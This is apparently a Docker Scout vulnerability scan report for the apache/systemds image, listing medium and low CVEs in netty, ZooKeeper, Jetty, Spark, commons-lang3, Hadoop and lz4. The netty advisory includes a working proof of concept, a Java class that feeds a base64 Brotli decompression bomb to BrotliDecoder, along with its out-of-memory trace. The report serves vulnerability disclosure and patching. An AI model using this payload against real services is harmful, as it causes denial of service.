<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>io.netty/netty-codec</strong> <code>4.1.96.Final</code> (maven)</summary>

<small><code>pkg:maven/io.netty/netty-codec@4.1.96.Final</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-58057?s=github&n=netty-codec&ns=io.netty&t=maven&vr=%3C4.1.125.Final"><img alt="medium 6.9: CVE--2025--58057" src="https://img.shields.io/badge/CVE--2025--58057-lightgrey?label=medium%206.9&labelColor=fbb552"/></a> <i>Improper Handling of Highly Compressed Data (Data Amplification)</i>

<table>
<tr><td>Affected range</td><td><code><4.1.125.Final</code></td></tr>
<tr><td>Fixed version</td><td><code>4.1.125.Final</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.070%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

With specially crafted input, `BrotliDecoder` and some other decompressing decoders will allocate a large number of reachable byte buffers, which can lead to denial of service.

### Details

`BrotliDecoder.decompress` has no limit in how often it calls `pull`, decompressing data 64K bytes at a time. The buffers are saved in the output list, and remain reachable until OOM is hit. This is basically a zip bomb.

Tested on 4.1.118, but there were no changes to the decoder since.

### PoC

Run this test case with `-Xmx1G`:

```java
import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;

import java.util.Base64;

public class T {
    public static void main(String[] args) {
        EmbeddedChannel channel = new EmbeddedChannel(new BrotliDecoder());
        channel.writeInbound(Unpooled.wrappedBuffer(Base64.getDecoder().decode("aPpxD1tETigSAGj6cQ8vRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROKBIAaPpxD1tETigSAGj6cQ9bRE4oEgBo+nEPW0ROMBIAEgIaHwBETlQQVFcXlgA=")));
    }
}
```

Error:

```
Exception in thread "main" java.lang.OutOfMemoryError: Cannot reserve 4194304 bytes of direct buffer memory (allocated: 1069580289, limit: 1073741824)
	at java.base/java.nio.Bits.reserveMemory(Bits.java:178)
	at java.base/java.nio.DirectByteBuffer.<init>(DirectByteBuffer.java:121)
	at java.base/java.nio.ByteBuffer.allocateDirect(ByteBuffer.java:332)
	at io.netty.buffer.PoolArena$DirectArena.allocateDirect(PoolArena.java:718)
	at io.netty.buffer.PoolArena$DirectArena.newChunk(PoolArena.java:693)
	at io.netty.buffer.PoolArena.allocateNormal(PoolArena.java:213)
	at io.netty.buffer.PoolArena.tcacheAllocateNormal(PoolArena.java:195)
	at io.netty.buffer.PoolArena.allocate(PoolArena.java:137)
	at io.netty.buffer.PoolArena.allocate(PoolArena.java:127)
	at io.netty.buffer.PooledByteBufAllocator.newDirectBuffer(PooledByteBufAllocator.java:403)
	at io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:188)
	at io.netty.buffer.AbstractByteBufAllocator.directBuffer(AbstractByteBufAllocator.java:179)
	at io.netty.buffer.AbstractByteBufAllocator.buffer(AbstractByteBufAllocator.java:116)
	at io.netty.handler.codec.compression.BrotliDecoder.pull(BrotliDecoder.java:70)
	at io.netty.handler.codec.compression.BrotliDecoder.decompress(BrotliDecoder.java:101)
	at io.netty.handler.codec.compression.BrotliDecoder.decode(BrotliDecoder.java:137)
	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:530)
	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:469)
	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:290)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:444)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:412)
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1357)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:440)
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:420)
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:868)
	at io.netty.channel.embedded.EmbeddedChannel.writeInbound(EmbeddedChannel.java:348)
	at io.netty.handler.codec.compression.T.main(T.java:11)
```

### Impact

DoS for anyone using `BrotliDecoder` on untrusted input.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.zookeeper/zookeeper</strong> <code>3.8.3</code> (maven)</summary>

<small><code>pkg:maven/org.apache.zookeeper/zookeeper@3.8.3</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-23944?s=github&n=zookeeper&ns=org.apache.zookeeper&t=maven&vr=%3E%3D3.8.0%2C%3C%3D3.8.3"><img alt="medium 5.3: CVE--2024--23944" src="https://img.shields.io/badge/CVE--2024--23944-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code>>=3.8.0<br/><=3.8.3</code></td></tr>
<tr><td>Fixed version</td><td><code>3.8.4</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.028%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Information disclosure in persistent watchers handling in Apache ZooKeeper due to missing ACL check. It allows an attacker to monitor child znodes by attaching a persistent watcher (addWatch command) to a parent which the attacker has already access to. ZooKeeper server doesn't do ACL check when the persistent watcher is triggered and as a consequence, the full path of znodes that a watch event gets triggered upon is exposed to the owner of the watcher. It's important to note that only the path is exposed by this vulnerability, not the data of znode, but since znode path can contain sensitive information like user name or login ID, this issue is potentially critical.

Users are recommended to upgrade to version 3.9.2, 3.8.4 which fixes the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-servlets</strong> <code>9.4.52.v20230823</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-servlets@9.4.52.v20230823</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-9823?s=github&n=jetty-servlets&ns=org.eclipse.jetty&t=maven&vr=%3E%3D9.0.0%2C%3C9.4.54"><img alt="medium 5.3: CVE--2024--9823" src="https://img.shields.io/badge/CVE--2024--9823-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=9.0.0<br/><9.4.54</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.54</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.591%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Description
There exists a security vulnerability in Jetty's DosFilter which can be exploited by unauthorized users to cause remote denial-of-service (DoS) attack on the server using DosFilter. By repeatedly sending crafted requests, attackers can trigger OutofMemory errors and exhaust the server's memory finally.


Vulnerability details
The Jetty DoSFilter (Denial of Service Filter) is a security filter designed to protect web applications against certain types of Denial of Service (DoS) attacks and other abusive behavior. It helps to mitigate excessive resource consumption by limiting the rate at which clients can make requests to the server.  The DoSFilter monitors and tracks client request patterns, including request rates, and can take actions such as blocking or delaying requests from clients that exceed predefined thresholds.  The internal tracking of requests in DoSFilter is the source of this OutOfMemory condition.


Impact
Users of the DoSFilter may be subject to DoS attacks that will ultimately exhaust the memory of the server if they have not configured session passivation or an aggressive session inactivation timeout.


Patches
The DoSFilter has been patched in all active releases to no longer support the session tracking mode, even if configured.


Patched releases:

  *  9.4.54
  *  10.0.18
  *  11.0.18
  *  12.0.3

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.spark/spark-network-common_2.12</strong> <code>3.5.0</code> (maven)</summary>

<small><code>pkg:maven/org.apache.spark/spark-network-common_2.12@3.5.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-55039?s=github&n=spark-network-common_2.12&ns=org.apache.spark&t=maven&vr=%3E%3D3.5.0%2C%3C3.5.2"><img alt="medium 4.6: CVE--2025--55039" src="https://img.shields.io/badge/CVE--2025--55039-lightgrey?label=medium%204.6&labelColor=fbb552"/></a> <i>Inadequate Encryption Strength</i>

<table>
<tr><td>Affected range</td><td><code>>=3.5.0<br/><3.5.2</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.2</code></td></tr>
<tr><td>CVSS Score</td><td><code>4.6</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:U</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.058%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

This issue affects Apache Spark versions before  3.4.4, 3.5.2 and 4.0.0.

Apache Spark versions before 4.0.0, 3.5.2 and 3.4.4 use an insecure default network encryption cipher for RPC communication between nodes.

When spark.network.crypto.enabled is set to true (it is set to false by default), but spark.network.crypto.cipher is not explicitly configured, Spark defaults to AES in CTR mode (AES/CTR/NoPadding), which provides encryption without authentication.

This vulnerability allows a man-in-the-middle attacker to modify encrypted RPC traffic undetected by flipping bits in ciphertext, potentially compromising heartbeat messages or application data and affecting the integrity of Spark workflows.

To mitigate this issue, users should either configure spark.network.crypto.cipher to AES/GCM/NoPadding to enable authenticated encryption or enable SSL encryption by setting spark.ssl.enabled to true, which provides stronger transport security.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>org.apache.commons/commons-lang3</strong> <code>3.12.0</code> (maven)</summary>

<small><code>pkg:maven/org.apache.commons/commons-lang3@3.12.0</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-48924?s=github&n=commons-lang3&ns=org.apache.commons&t=maven&vr=%3E%3D3.0%2C%3C3.18.0"><img alt="medium 6.5: CVE--2025--48924" src="https://img.shields.io/badge/CVE--2025--48924-lightgrey?label=medium%206.5&labelColor=fbb552"/></a> <i>Uncontrolled Recursion</i>

<table>
<tr><td>Affected range</td><td><code>>=3.0<br/><3.18.0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.18.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.016%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Uncontrolled Recursion vulnerability in Apache Commons Lang.

This issue affects Apache Commons Lang: Starting with commons-lang:commons-lang 2.0 to 2.6, and, from org.apache.commons:commons-lang3 3.0 before 3.18.0.

The methods ClassUtils.getClass(...) can throw StackOverflowError on very long inputs. Because an Error is usually not handled by applications and libraries, a StackOverflowError could cause an application to stop.

Users are recommended to upgrade to version 3.18.0, which fixes the issue.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>org.apache.hadoop/hadoop-common</strong> <code>3.3.6</code> (maven)</summary>

<small><code>pkg:maven/org.apache.hadoop/hadoop-common@3.3.6</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-23454?s=github&n=hadoop-common&ns=org.apache.hadoop&t=maven&vr=%3C3.4.0"><img alt="low 2.0: CVE--2024--23454" src="https://img.shields.io/badge/CVE--2024--23454-lightgrey?label=low%202.0&labelColor=fce1a9"/></a> <i>Improper Privilege Management</i>

<table>
<tr><td>Affected range</td><td><code><3.4.0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.4.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.038%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Apache Hadoop’s `RunJar.run()` does not set permissions for temporary directory by default. If sensitive data will be present in this file, all the other local users may be able to view the content. This is because, on unix-like systems, the system temporary directory is shared between all local users. As such, files written in this directory, without setting the correct posix permissions explicitly, may be viewable by all other local users.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>org.eclipse.jetty/jetty-xml</strong> <code>9.4.51.v20230217</code> (maven)</summary>

<small><code>pkg:maven/org.eclipse.jetty/jetty-xml@9.4.51.v20230217</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-58qw-p7qm-5rvh?s=github&n=jetty-xml&ns=org.eclipse.jetty&t=maven&vr=%3C%3D9.4.51"><img alt="low 3.9: GHSA--58qw--p7qm--5rvh" src="https://img.shields.io/badge/GHSA--58qw--p7qm--5rvh-lightgrey?label=low%203.9&labelColor=fce1a9"/></a> <i>Improper Restriction of XML External Entity Reference</i>

<table>
<tr><td>Affected range</td><td><code><=9.4.51</code></td></tr>
<tr><td>Fixed version</td><td><code>9.4.52.v20230823</code></td></tr>
<tr><td>CVSS Score</td><td><code>3.9</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:L/I:L/A:L</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### From the reporter

> `XmlParser` is vulnerable to XML external entity (XXE) vulnerability.
>  XmlParser is being used when parsing Jetty’s xml configuration files. An attacker might exploit
> this vulnerability in order to achieve SSRF or cause a denial of service.
> One possible scenario is importing a (remote) malicious WAR into a Jetty’s server, while the
> WAR includes a malicious web.xml.

### Impact
There are no circumstances in a normally deployed Jetty server where potentially hostile XML is given to the XmlParser class without the attacker already having arbitrary access to the server. I.e. in order to exploit `XmlParser` the attacker would already have the ability to deploy and execute hostile code.  Specifically, Jetty has no protection against malicious web application and potentially hostile web applications should only be run on an isolated virtualisation.  

Thus this is not considered a vulnerability of the Jetty server itself, as any such usage of the jetty XmlParser is equally vulnerable as a direct usage of the JVM supplied SAX parser.  No CVE will be allocated to this advisory.

However, any direct usage of the `XmlParser` class by an application may be vulnerable.  The impact would greatly depend on how the application uses `XmlParser`, but it could be a denial of service due to large entity expansion, or possibly the revealing local files if the XML results are accessible remotely.

### Patches
Ability to configure the SAXParserFactory to fit the needs of your particular XML parser implementation have been merged as part of PR #10067

### Workarounds
Don't use `XmlParser` to parse data from users.




</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <img alt="unspecified: 1" src="https://img.shields.io/badge/U-1-lightgrey"/><strong>lz4</strong> <code>1.9.4-r5</code> (apk)</summary>

<small><code>pkg:apk/alpine/lz4@1.9.4-r5?os_name=alpine&os_version=3.20</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-62813?s=alpine&n=lz4&ns=alpine&t=apk&osn=alpine&osv=3.20&vr=%3C%3D1.9.4-r5"><img alt="unspecified : CVE--2025--62813" src="https://img.shields.io/badge/CVE--2025--62813-lightgrey?label=unspecified%20&labelColor=lightgrey"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.9.4-r5</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.018%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>



</blockquote>
</details>
</details></td></tr>
</table>


What's next:
    View base image update recommendations → docker scout recommendations apache/systemds:latest

